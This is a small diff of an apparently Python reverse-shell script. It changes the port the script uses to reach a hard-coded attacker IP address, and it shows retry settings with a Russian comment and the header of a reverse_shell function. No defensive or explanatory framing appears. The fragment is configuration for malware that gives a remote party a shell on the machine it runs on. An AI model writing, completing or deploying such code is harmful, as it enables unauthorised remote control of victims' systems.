@@ -5,7 +5,7 @@ import threading
 import time
 
 ATTACKER_IP = "62.72.20.148"
-ATTACKER_PORT = 4444
+ATTACKER_PORT = 4442
 RETRY_DELAY = 30  # секунд между попытками
 
 def reverse_shell():
